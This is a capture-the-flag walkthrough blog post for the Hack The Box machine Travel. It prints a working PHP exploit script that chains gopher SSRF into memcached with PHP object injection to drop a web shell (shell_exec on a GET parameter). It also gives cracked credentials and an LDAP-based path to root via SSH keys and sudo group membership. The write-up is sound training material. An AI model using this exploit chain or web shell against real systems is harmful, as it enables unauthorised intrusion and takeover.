---
layout: post  
title: "Travel: Hack The Box Walkthrough"
date: 2020-09-12 17:40:04 +0000
last_modified_at: 2020-09-12 17:40:04 +0000
category: Walkthrough
tags: ["Hack The Box", Travel, retired, Linux, Hard]
comments: true
protect: false
image:
  feature: travel-htb-walkthrough.png
---

This post documents the complete walkthrough of Travel, a retired vulnerable [VM][1] created by [jkr][2] and [xct][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Travel is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let\'s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.189 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-05-23 18:00:47 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.189
Discovered open port 80/tcp on 10.10.10.189
Discovered open port 443/tcp on 10.10.10.189
```

Nothing unusual stands out. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,443 -A --reason 10.10.10.189 -oN nmap.txt
...
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     syn-ack ttl 62 nginx 1.17.6
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB
443/tcp open  ssl/http syn-ack ttl 62 nginx 1.17.6
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB - SSL coming soon.
| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
| Issuer: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-23T19:24:29
| Not valid after:  2030-04-21T19:24:29
| MD5:   ef0a a4c1 fbad 1ac4 d160 58e3 beac 9698
|_SHA-1: 0170 7c30 db3e 2a93 cda7 7bbe 8a8b 7777 5bcd 0498
```

The SSL certificate exposes alternative host names for `10.10.10.189`: `www.travel.htb`, `blog.travel.htb` and `blog-dev.travel.htb`. I'd better put them into `/etc/hosts`. Here's what they look like.

_`http://travel.htb:80`_

{% include image.html image_alt="b57584b4.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/b57584b4.png" %}

_`https://(((www|blog|blog-dev)\.)?travel)\.htb:443`_

{% include image.html image_alt="d010d9d0.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/d010d9d0.png" %}

_`http://blog.travel.htb:80`_

{% include image.html image_alt="39faecf1.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/39faecf1.png" %}

_`http://blog-dev.travel.htb:80`_

{% include image.html image_alt="f7af316f.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/f7af316f.png" %}

### Directory/File Enumeration

Something tells me that I should fuzz `blog-dev.travel.htb` for directories and files. Let's do that with `wfuzz` and `quickhits.txt` from SecLists.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 20 --hc 404 http://blog-dev.travel.htb/FUZZ
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://blog-dev.travel.htb/FUZZ
Total requests: 2439

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000106:   301        7 L      11 W     170 Ch      "/.git"
000000108:   403        7 L      9 W      154 Ch      "/.git/"
000000110:   200        1 L      2 W      23 Ch       "/.git/HEAD"
000000111:   200        4 L      13 W     292 Ch      "/.git/index"
000000109:   200        5 L      13 W     92 Ch       "/.git/config"
000000112:   403        7 L      9 W      154 Ch      "/.git/logs/"
000000113:   200        1 L      11 W     153 Ch      "/.git/logs/HEAD"
000000114:   301        7 L      11 W     170 Ch      "/.git/logs/refs"

Total time: 32.50404
Processed Requests: 2439
Filtered Requests: 2431
Requests/sec.: 75.03680
```

What do we have here? A `.git` repository!

### GitDumper from GitTools

[GitDumper](https://github.com/internetwache/GitTools/tree/master/Dumper) is a tool for downloading .git repositories from webservers which do not have directory listing enabled. Perfect.

{% include image.html image_alt="99c30d02.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/99c30d02.png" %}

#### Restore deleted files

We have some deleted files as shown below.

{% include image.html image_alt="74799e08.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/74799e08.png" %}

Let's restore them like so.

{% include image.html image_alt="cde32140.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/cde32140.png" %}

<div class="filename"><span>README.md</span></div>

```
# Rss Template Extension

Allows rss-feeds to be shown on a custom wordpress page.

## Setup

* `git clone https://github.com/WordPress/WordPress.git`
* copy rss_template.php & template.php to `wp-content/themes/twentytwenty`
* create logs directory in `wp-content/themes/twentytwenty`
* create page in backend and choose rss_template.php as theme

## Changelog

- temporarily disabled cache compression
- added additional security checks
- added caching
- added rss template

## ToDo

- finish logging implementation
```

<div class="filename"><span>rss_template.php</span></div>

```php
<?php
/*
Template Name: Awesome RSS
*/
include('template.php');
get_header();
?>

<main class="section-inner">
  <?php
  function get_feed($url){
     require_once ABSPATH . '/wp-includes/class-simplepie.php';
     $simplepie = null;
     $data = url_get_contents($url);
     if ($url) {
         $simplepie = new SimplePie();
         $simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
         //$simplepie->set_raw_data($data);
         $simplepie->set_feed_url($url);
         $simplepie->init();
         $simplepie->handle_content_type();
         if ($simplepie->error) {
             error_log($simplepie->error);
             $simplepie = null;
             $failed = True;
         }
     } else {
         $failed = True;
     }
     return $simplepie;
   }

  $url = $_SERVER['QUERY_STRING'];
  if(strpos($url, "custom_feed_url") !== false){
    $tmp = (explode("=", $url));
    $url = end($tmp);
   } else {
    $url = "http://www.travel.htb/newsfeed/customfeed.xml";
   }
   $feed = get_feed($url);
     if ($feed->error())
    {
      echo '<div class="sp_errors">' . "\r\n";
      echo '<p>' . htmlspecialchars($feed->error()) . "</p>\r\n";
      echo '</div>' . "\r\n";
    }
    else {
  ?>
  <div class="chunk focus">
    <h3 class="header">
    <?php
      $link = $feed->get_link();
      $title = $feed->get_title();
      if ($link)
      {
        $title = "<a href='$link' title='$title'>$title</a>";
      }
      echo $title;
    ?>
    </h3>
    <?php echo $feed->get_description(); ?>

  </div>
  <?php foreach($feed->get_items() as $item): ?>
    <div class="chunk">
      <h4><?php if ($item->get_permalink()) echo '<a href="' . $item->get_permalink() . '">'; echo $item->get_title(); if ($item->get_permalink()) echo '</a>'; ?>&nbsp;<span class="footnote"><?php echo $item->get_date('j M Y, g:i a'); ?></span></h4>
      <?php echo $item->get_content(); ?>
      <?php
      if ($enclosure = $item->get_enclosure(0))
      {
        echo '<div align="center">';
        echo '<p>' . $enclosure->embed(array(
          'audio' => './for_the_demo/place_audio.png',
          'video' => './for_the_demo/place_video.png',
          'mediaplayer' => './for_the_demo/mediaplayer.swf',
          'altclass' => 'download'
        )) . '</p>';
        if ($enclosure->get_link() && $enclosure->get_type())
        {
          echo '<p class="footnote" align="center">(' . $enclosure->get_type();
          if ($enclosure->get_size())
          {
            echo '; ' . $enclosure->get_size() . ' MB';
          }
          echo ')</p>';
        }
        if ($enclosure->get_thumbnail())
        {
          echo '<div><img src="' . $enclosure->get_thumbnail() . '" alt="" /></div>';
        }
        echo '</div>';
      }
      ?>

    </div>
  <?php endforeach; ?>
<?php } ?>
</main>

<!--
DEBUG
<?php
if (isset($_GET['debug'])){
  include('debug.php');
}
?>
-->

<?php get_template_part( 'template-parts/footer-menus-widgets' ); ?>

<?php
get_footer();
```

<div class="filename"><span>template.php</span></div>

```php
<?php

/**
 Todo: finish logging implementation via TemplateHelper
*/

function safe($url)
{
  // this should be secure
  $tmpUrl = urldecode($url);
  if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
  {
    die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");
  }
  if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
  {
    die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");
  }
  $tmp = parse_url($url, PHP_URL_HOST);
  // preventing all localhost access
  if($tmp == "localhost" or $tmp == "127.0.0.1")
  {
    die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");
  }
  return $url;
}

function url_get_contents ($url) {
    $url = safe($url);
  $url = escapeshellarg($url);
  $pl = "curl ".$url;
  $output = shell_exec($pl);
    return $output;
}


class TemplateHelper
{

    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
      $this->init($file, $data);
    }

    public function __wakeup()
    {
      $this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}
```

Notice that `TemplateHelper` is not used anywhere else and that upon `unserialize()` through `__wakeup()` writes to `/logs/`? Perhaps we can make use of that to write a PHP backdoor to `/logs/`? But how?

### PHP Object Injection

The creators of this box didn't leave us to die. They threw a lifeline in the form of a `debug` parameter near the bottom of `rss_template.php`. When the `debug` parameter is included in the query string along with the `custom_feed_url` parameter pointing to a valid Atom/RSS feed like so.

```
http://blog.travel.htb/awesome-rss/?debug&custom_feed_url=http://10.10.16.16/feed.xml
```

You'll get the following response in `debug.php`.

{% include image.html image_alt="416f2186.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/416f2186.png" %}

Well, how do you interpret the response? For that, you need to dig into the source code of `SimplePie`'s `SimplePie_Cache_Memcache` [class](https://github.com/simplepie/simplepie/blob/master/library/SimplePie/Cache/Memcache.php).

{% include image.html image_alt="95504a30.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/95504a30.png" %}

The left column, `xct_7f123f6a2e(...)`, represents the key and the column next to it represents the value, as you are probably aware, `memcached` operates in key-value pair. What is this value? According to the code, this value is the serialized string of an array, representing a `SimplePie` Atom/RSS feed.

In summary, the response you see in `debug.php` is an indication that the key-value pair was retrieved from `memcached`, and that `SimplePie` had unserialized the array.

{% include image.html image_alt="638bf754.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/638bf754.png" %}

The big question is—how do we get a malicious serialized PHP object into `memcached` such that `SimplePie` retrieves it instead?

### Memcached SSRF through `curl`

I was wondering what's the purpose of `curl` in `template.php` since it's only used once in `rss_template.php` at the following line:

```
$data = url_get_contents($url);
```

If I'd to guess, I'd say that's probably the intended way to preload `memcached` with the malicious serialized PHP object. There's a way to bypass the filters using `http://0:11211` like so. In Linux, `0` represents the `localhost`.

{% include image.html image_alt="636b3a97.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/636b3a97.png" %}

So, if it I can pass such an URL to `curl` via `custom_feed_url`, I should be able to preload the memcache. One more thing, I need a plaintext protocol that'll allow me to directly write data to `memcached` like so:

```
<scheme>://0:11211/<path>
```

After some experimentation, `gopher` is selected and we have to prepend another slash to `<path>`. Armed with this insight, I wrote the following PHP script to exploit it.

```php
<?php

include('template.php');

$feed = 'http://10.10.16.16:8000/feed.xml';
$type = 'spc';
$key  = "xct_" . md5(md5($feed) . ':' . $type);

$crlf = '%0D%0A';
$space = '%20';
$payload = serialize(new TemplateHelper($argv[1], $argv[2]));
$length = strlen($payload);
$payload = rawurlencode($payload);

/* preload memcache */
shell_exec('curl \\' .
    '-s \\' .
    '-m 5 \\' .
    '-o /dev/null \\' .
    'http://blog.travel.htb/awesome-rss/?custom_feed_url=' .
    'gopher://0:11211//' .
    $crlf .
    'set' . $space . $key . $space . '0'. $space . '60' . $space . $length .
    $crlf .
    $payload .
    $crlf);

/* reload */
shell_exec('curl \\' .
    '-s \\' .
    '-m 5 \\' .
    '-o /dev/null \\' .
    'http://blog.travel.htb/awesome-rss/?custom_feed_url=' .
    $feed);

echo '[*] Backdoor at http://blog.travel.htb/wp-content/themes/twentytwenty/logs/' . $argv[1] . "\n";

?>
```

The script takes in two arguments: (1) filename to write to `/logs/` and (2) the PHP backdoor code. If the server is not responding fast enough, increase `curl`'s maximum waiting time (`-m`). Run the exploit like so.

```
# php exploit.php info.php '<?php phpinfo(); ?>'
[*] Backdoor at http://blog.travel.htb/wp-content/themes/twentytwenty/logs/info.php
```

The backdoor should be written to `/logs/` like so.

{% include image.html image_alt="74290f6b.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/74290f6b.png" %}

## Low-Privilege Shell

Time to write another backdoor that allows us to execute remote commands.

```
# php exploit.php cmd.php '<?php echo shell_exec($_GET[0]); ?>'
```

Bam.

{% include image.html image_alt="4bac106f.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/4bac106f.png" %}

Let's run a one-liner Perl reverse shell back to me.

{% include image.html image_alt="f5af570a.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/f5af570a.png" %}

Sweet.

### Getting `user.txt`

The access I got into was a docker container for `blog.travel.htb`, aptly named `blog`.

{% include image.html image_alt="fb41c5ef.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/fb41c5ef.png" %}

During enumeration, I notice that a backup of the previous WordPress database is at `/opt/wordpress/backup-13-04-2020.sql`.

```
INSERT INTO `wp_users` VALUES
(1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http://localhost','2020-04-13 13:19:01','',0,'admin'),
(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');
```

Who is Lynik Schmidt? By the way the password hash can be easily cracked with John the Ripper.

{% include image.html image_alt="e80ea0da.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/e80ea0da.png" %}

The password is `1stepcloser`. Comforting to know, isn't it? Let's see if this password grants us access to SSH.

{% include image.html image_alt="546cf944.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/546cf944.png" %}

Awesome. The file `user.txt` is at `lynik-admin`'s home directory.

{% include image.html image_alt="e34d6ee6.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/e34d6ee6.png" %}

## Privilege Escalation

During enumeration of `lynik-admin`'s account, I noticed the presence of an immutable file `.ldaprc` that suggests another docker container hosting a LDAP server.

<div class="filename"><span>.ldaprc</span></div>

```
HOST ldap.travel.htb
BASE dc=travel,dc=htb
BINDDN cn=lynik-admin,dc=travel,dc=htb
```

I also notice the BINDPW in `.viminfo`.

{% include image.html image_alt="41e37469.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/41e37469.png" %}

### Apache Directory Studio

Armed with the Bind DN (_`username`_) and the Bind password (_`password`_), we can use Apache Directory Studio to make a connection to the LDAP server to see what we can do with it. But first, we need to make a local port forwarding with our SSH connection like so. That's because Apache Directory Studio is on my attacking machine.

```
# ssh -L389:ldap.travel.htb:389 lynik-admin@10.10.10.189
```

Once that's done, we can fill in the information to make a LDAP connection.

{% include image.html image_alt="83d0ca35.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/83d0ca35.png" %}

Enter the Bind DN and Bind password.

{% include image.html image_alt="8fc52950.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/8fc52950.png" %}

This is what the directory tree looks like.

{% include image.html image_alt="fd986b8f.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/fd986b8f.png" %}

Hmm. Where are the users located at? I don't see them in `/etc/passwd`.

### SSH Access with SSSD Authentication to LDAP

It turns out that SSH access is managed by SSSD where it retrieves the public keys needed for SSH logins.

<div class="filename"><span>/etc/ssh/sshd_config</span></div>

```
Include /etc/ssh/sshd_config.d/*.conf
AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys
AuthorizedKeysCommandUser nobody
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp  /usr/lib/openssh/sftp-server
PasswordAuthentication no
Match User trvl-admin,lynik-admin
        PasswordAuthentication yes
```

You can see that only `trvl-admin` and `lynik-admin` are allowed to log in with passwords. `lynik-admin` doesn't have read access to `/etc/sssd` but if I'd to guess, I'd say that SSSD pulls the public keys from LDAP.

With that in mind, we can make use of the fact the `lynik-admin` is the LDAP administrator to add public keys to any user in the `domainusers` group. Here's how. Let's pick `brian`.

{% include image.html image_alt="a6c3a242.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/a6c3a242.png" %}

Click on the **New Attribute** highlighted above.

{% include image.html image_alt="b398a5db.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/b398a5db.png" %}

Select **objectClass** as the atrribute type and click **Finish**.

{% include image.html image_alt="1b9fe0c1.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/1b9fe0c1.png" %}

Add the **ldapPublicKey** object class as shown. Click **Next** and **Finish**.

{% include image.html image_alt="162c447b.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/162c447b.png" %}

Add another attribute: **sshPublicKey**. Click **Finish**. Click on **Edit as Text** and go to the **Text Editor**.

{% include image.html image_alt="b07937c1.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/b07937c1.png" %}

Paste any SSH public key you control. For convenience's sake, you can use `ssh-keygen` to generate a key pair at `lynik-admin`'s home directory.

### Getting `root.txt`

Once that's done, we need to change **gidNumber** to `sudo` (27) and give `brian` a password (any password of your choice) through the **userPassword** attribute.

{% include image.html image_alt="2ab87b34.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/2ab87b34.png" %}

Once that's done, this is what it should look like.

{% include image.html image_alt="4c84803e.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/4c84803e.png" %}

Now, let's log in as `brian`.

{% include image.html image_alt="ae9d0ed6.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/ae9d0ed6.png" %}

Followed by a `sudo`.

{% include image.html image_alt="91c48a88.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/91c48a88.png" %}

Bam. We are `root`. Getting `root.txt` should be a breeze.

{% include image.html image_alt="95792041.png" image_src="/ee0b9ede-f5a3-41e3-b2c8-e896ab653ff8/95792041.png" %}

:dancer:

*[LDAP]:Lightweight Directory Access Protocol
*[SSH]:Secure Shell
*[SSRF]:Server Side Request Forgery
*[SSSD]:System Security Services Daemon

[1]: https://www.hackthebox.eu/home/machines/profile/252
[2]: https://www.hackthebox.eu/home/users/profile/77141
[3]: https://www.hackthebox.eu/home/users/profile/13569
[4]: https://www.hackthebox.eu/
